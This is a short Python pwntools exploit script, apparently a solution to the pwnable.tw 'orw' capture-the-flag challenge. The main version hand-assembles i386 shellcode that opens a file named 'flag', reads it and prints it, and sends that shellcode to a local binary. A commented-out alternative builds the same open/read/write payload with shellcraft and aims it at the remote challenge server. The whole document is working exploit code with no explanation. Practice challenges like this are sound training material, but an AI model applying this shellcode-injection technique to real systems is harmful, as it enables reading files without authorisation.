from pwn import *

s = process('./orw')

shellcode = ''

shellcode += asm('xor ecx,ecx;mov eax,0x5; push ecx;push 0x67616c66;mov ebx,esp;xor edx,edx;int 0x80;')

shellcode += asm('mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov dl,0x30;int 0x80;')

shellcode += asm('mov eax,0x4;mov bl,0x1;int 0x80;')

s.recvuntil(':')
s.sendline(shellcode)

flag = s.recv()
print flag
'''
from pwn import *

p = remote("chall.pwnable.tw", 10001)
shellcode = ""
shellcode += shellcraft.i386.pushstr("/home/orw/flag")    
shellcode += shellcraft.i386.linux.syscall("SYS_open", 'esp')
shellcode += shellcraft.i386.linux.syscall("SYS_read", 'eax', 'esp', 0x30)
shellcode += shellcraft.i386.linux.syscall("SYS_write", 1, 'esp', 0x30)
p.recvuntil(":")
p.send(asm(shellcode))
p.interactive()
'''
